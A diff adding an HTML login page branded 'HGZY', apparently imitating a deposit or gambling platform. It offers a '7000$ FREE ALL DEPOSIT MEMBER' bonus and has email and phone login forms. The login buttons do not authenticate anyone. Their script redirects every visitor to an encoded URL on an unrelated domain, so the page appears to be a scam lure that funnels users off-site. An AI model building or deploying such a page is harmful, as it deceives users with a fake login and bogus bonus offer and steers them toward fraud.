@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* CSS (style.css) code starts here */
+        body {
+            font-family: sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            box-sizing: border-box;
+        }
+
+        .container {
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(to right, #ff6b6b, #ff4d4d);
+            color: white;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .back-arrow {
+            color: white;
+            font-size: 24px;
+            text-decoration: none;
+        }
+
+        .logo {
+            flex-grow: 1;
+            text-align: center;
+        }
+
+        .language {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+        }
+
+        .language img {
+            width: 20px;
+            margin-right: 5px;
+        }
+
+        .login-section {
+            padding: 20px;
+        }
+
+        .login-section h2 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .login-section p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        .tabs {
+            display: flex;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .tab {
+            flex: 1;
+            text-align: center;
+            padding: 10px 0;
+            cursor: pointer;
+            color: #888;
+            position: relative;
+        }
+
+        .tab.active {
+            color: #ff4d4d;
+        }
+
+        .tab.active::after {
+            content: '';
+            position: absolute;
+            bottom: -1px;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background-color: #ff4d4d;
+        }
+
+        .tab i {
+            margin-right: 5px;
+        }
+
+        .promo-text {
+            background-color: #ffeaea;
+            color: #ff4d4d;
+            border: 1px solid #ffcccc;
+            padding: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 14px;
+            border-radius: 5px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+            font-size: 14px;
+        }
+
+        .input-group input {
+            width: calc(100% - 20px);
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #ff4d4d;
+        }
+
+        .phone-input-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .phone-input-group select {
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            margin-right: 10px;
+            font-size: 16px;
+            height: 42px; /* To match input height */
+        }
+
+        .phone-input-group input {
+            flex-grow: 1;
+            width: auto; /* Override default width */
+        }
+
+        .password-input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .password-input-wrapper input {
+            width: 100%;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            cursor: pointer;
+            color: #888;
+        }
+
+        .remember-password {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .remember-password input {
+            margin-right: 8px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 15px;
+            transition: background-color 0.3s ease;
+        }
+
+        .login-btn {
+            background: linear-gradient(to right, #ff6b6b, #ff4d4d);
+            color: white;
+        }
+
+        .login-btn:hover {
+            background: linear-gradient(to right, #ff4d4d, #ff6b6b);
+        }
+
+        .register-btn {
+            background-color: #f0f2f5;
+            color: #ff4d4d;
+            border: 1px solid #ff4d4d;
+        }
+
+        .register-btn:hover {
+            background-color: #ffeaea;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: space-around;
+            padding: 20px;
+            border-top: 1px solid #eee;
+        }
+
+        .footer-item {
+            text-align: center;
+            color: #888;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        .footer-item i {
+            display: block;
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+
+        .chat-icon img {
+            width: 24px;
+            height: 24px;
+        }
+        /* CSS (style.css) code ends here */
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <a href="#" class="back-arrow"><i class="fas fa-chevron-left"></i></a>
+            <div class="logo">HGZY</div>
+            <div class="language">
+                <img src="https://flagicons.lipis.dev/flags/4x3/us.svg" alt="US Flag">
+                <span>EN</span>
+            </div>
+        </div>
+
+        <div class="login-section">
+            <h2>Log in</h2>
+            <p>Please log in with your phone number or email</p>
+            <p>If you forget your password, please contact customer service</p>
+
+            <div class="tabs">
+                <div class="tab" id="phone-tab">
+                    <i class="fas fa-mobile-alt"></i> phone number
+                </div>
+                <div class="tab active" id="email-tab">
+                    <i class="fas fa-envelope"></i> Email Login
+                </div>
+            </div>
+
+            <div class="tab-content" id="email-content">
+                <div class="promo-text">7000$ FREE ALL DEPOSIT MEMBER</div>
+
+                <div class="input-group">
+                    <label for="email"><i class="fas fa-envelope"></i> Mail</label>
+                    <input type="email" id="email" placeholder="please input your email">
+                </div>
+
+                <div class="input-group">
+                    <label for="password"><i class="fas fa-lock"></i> Password</label>
+                    <div class="password-input-wrapper">
+                        <input type="password" id="password" placeholder="Password">
+                        <span class="toggle-password" onclick="togglePasswordVisibility()"><i class="fas fa-eye-slash"></i></span>
+                    </div>
+                </div>
+
+                <div class="remember-password">
+                    <input type="checkbox" id="remember">
+                    <label for="remember">Remember password</label>
+                </div>
+
+                <button class="btn login-btn">Log in</button>
+                <button class="btn register-btn">Register</button>
+            </div>
+
+            <div class="tab-content" id="phone-content" style="display: none;">
+                <div class="promo-text">7000$ FREE ALL DEPOSIT MEMBER</div>
+
+                <div class="input-group">
+                    <label for="phone-number"><i class="fas fa-mobile-alt"></i> Phone Number</label>
+                    <div class="phone-input-group">
+                        <select id="country-code">
+                            <option value="+880">+880 (BD)</option>
+                            <option value="+1">+1 (US)</option>
+                            <option value="+91">+91 (IN)</option>
+                            </select>
+                        <input type="tel" id="phone-number" placeholder="e.g., 17XXXXXXXX">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label for="phone-password"><i class="fas fa-lock"></i> Password</label>
+                    <div class="password-input-wrapper">
+                        <input type="password" id="phone-password" placeholder="Password">
+                        <span class="toggle-password" onclick="togglePasswordVisibilityPhone()"><i class="fas fa-eye-slash"></i></span>
+                    </div>
+                </div>
+
+                <div class="remember-password">
+                    <input type="checkbox" id="remember-phone">
+                    <label for="remember-phone">Remember password</label>
+                </div>
+
+                <button class="btn login-btn">Log in</button>
+                <button class="btn register-btn">Register</button>
+            </div>
+
+        </div>
+
+        <div class="footer-links">
+            <div class="footer-item">
+                <i class="fas fa-lock"></i>
+                <span>Forgot password</span>
+            </div>
+            <div class="footer-item">
+                <i class="fas fa-headset"></i>
+                <span>Customer Service</span>
+            </div>
+             <div class="footer-item chat-icon">
+                <img src="https://www.flaticon.com/svg/v2/svg/3031/3031268.svg" alt="Chat Icon"> </div>
+        </div>
+    </div>
+    <script>
+        /* JavaScript (script.js) code starts here */
+        document.addEventListener('DOMContentLoaded', function() {
+            const phoneTab = document.getElementById('phone-tab');
+            const emailTab = document.getElementById('email-tab');
+            const phoneContent = document.getElementById('phone-content');
+            const emailContent = document.getElementById('email-content');
+
+            // Set initial active tab based on your preference.
+            // If you want phone number tab to be active by default, change 'emailTab' to 'phoneTab' below.
+            // For now, it's set to email login as per your image.
+            emailTab.classList.add('active');
+            phoneContent.style.display = 'none';
+            emailContent.style.display = 'block';
+
+
+            phoneTab.addEventListener('click', function() {
+                phoneTab.classList.add('active');
+                emailTab.classList.remove('active');
+                phoneContent.style.display = 'block';
+                emailContent.style.display = 'none';
+            });
+
+            emailTab.addEventListener('click', function() {
+                emailTab.classList.add('active');
+                phoneTab.classList.remove('active');
+                emailContent.style.display = 'block';
+                phoneContent.style.display = 'none';
+            });
+
+            // Get all buttons with the class 'login-btn'
+            const loginButtons = document.querySelectorAll('.login-btn');
+
+            // Add a click event listener to each login button
+            loginButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    window.location.href = 'https://mentheaparis.fr/M1A4VDFRNnU0MzVBN2E=';
+                });
+            });
+        });
+
+        function togglePasswordVisibility() { // For Email password field
+            const passwordField = document.getElementById('password');
+            const toggleIcon = document.querySelector('#email-content .toggle-password i'); // Specific to email content
+
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                toggleIcon.classList.remove('fa-eye-slash');
+                toggleIcon.classList.add('fa-eye');
+            } else {
+                passwordField.type = 'password';
+                toggleIcon.classList.remove('fa-eye');
+                toggleIcon.classList.add('fa-eye-slash');
+            }
+        }
+
+        function togglePasswordVisibilityPhone() { // For Phone password field
+            const passwordField = document.getElementById('phone-password');
+            const toggleIcon = document.querySelector('#phone-content .toggle-password i'); // Specific to phone content
+
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                toggleIcon.classList.remove('fa-eye-slash');
+                toggleIcon.classList.add('fa-eye');
+            } else {
+                passwordField.type = 'password';
+                toggleIcon.classList.remove('fa-eye');
+                toggleIcon.classList.add('fa-eye-slash');
+            }
+        }
+        /* JavaScript (script.js) code ends here */
+    </script>
+</body>
+</html>
